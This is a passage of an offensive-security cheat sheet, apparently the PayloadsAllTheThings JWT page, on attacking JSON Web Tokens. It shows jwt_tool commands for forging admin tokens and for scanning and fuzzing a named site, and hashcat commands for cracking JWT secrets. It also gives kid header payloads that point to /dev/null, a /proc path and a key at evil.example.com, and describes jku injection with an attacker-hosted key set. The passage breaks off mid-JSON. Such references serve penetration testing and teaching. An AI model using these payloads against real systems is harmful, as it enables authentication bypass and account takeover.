<!-- source: JSON Web Token/README.md | chunk 4/5 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

[4] Sign token with key file

Please select an option from above (1-4):
> 1

Please enter the known key:
> secret

Please enter the key length:
[1] HMAC-SHA256
[2] HMAC-SHA384
[3] HMAC-SHA512
> 1

Your new forged token:
[+] URL safe: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
[+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
```

- Recon: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
- Scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
- Exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
- Fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
- Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`

#### Hashcat

> Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - [src](https://twitter.com/hashcat/status/955154646494040065)

- Dictionary attack: `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
- Rule-based attack: `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
- Brute force attack: `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`

## JWT Claims

[IANA's JSON Web Token Claims](https://www.iana.org/assignments/jwt/jwt.xhtml)

### JWT kid Claim Misuse

The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the JWT.

- Example #1 : Local file

    ```json
    {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/root/res/keys/secret.key"
    }
    ```

- Example #2 : Remote file

    ```json
    {
        "alg":"RS256",
        "typ":"JWT",
        "kid":"http://localhost:7070/privKey.key"
    }
    ```

The content of the file specified in the kid header will be used to generate the signature.

```js
// Example for HS256
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret-from-secret.key
)
```

The common ways to misuse the kid header:

- Get the key content to change the payload
- Change the key path to force your own

    ```py
    >>> jwt.encode(
    ...     {"some": "payload"},
    ...     "secret",
    ...     algorithm="HS256",
    ...     headers={"kid": "http://evil.example.com/custom.key"},
    ... )
    ```

- Change the key path to a file with a predictable content.

  ```ps1
  python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
  python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
  ```

- Modify the kid header to attempt SQL and Command Injections

### JWKS - jku header injection

"jku" header value points to the URL of the JWKS file. By replacing the "jku" URL with an attacker-controlled URL containing the Public Key, an attacker can use the paired Private Key to sign the token and let the service retrieve the malicious Public Key and verify the token.

It is sometimes exposed publicly via a standard endpoint:

- `/jwks.json`
- `/.well-known/jwks.json`
- `/openid/connect/jwks.json`
- `/api/keys`
- `/api/v1/keys`
- [`/{tenant}/oauth2/v1/certs`](https://web.archive.org/web/20240116204119/https://docs.theidentityhub.com/doc/Protocol-Endpoints/OpenID-Connect/OpenID-Connect-JWKS-Endpoint.html)

You should create your own key pair for this attack and host it. It should look like that:

```json
{
    "keys": [
        {
            "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
            "kty": "RSA",
            "e": "AQAB",
            "n": "nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ"
        }
    ]
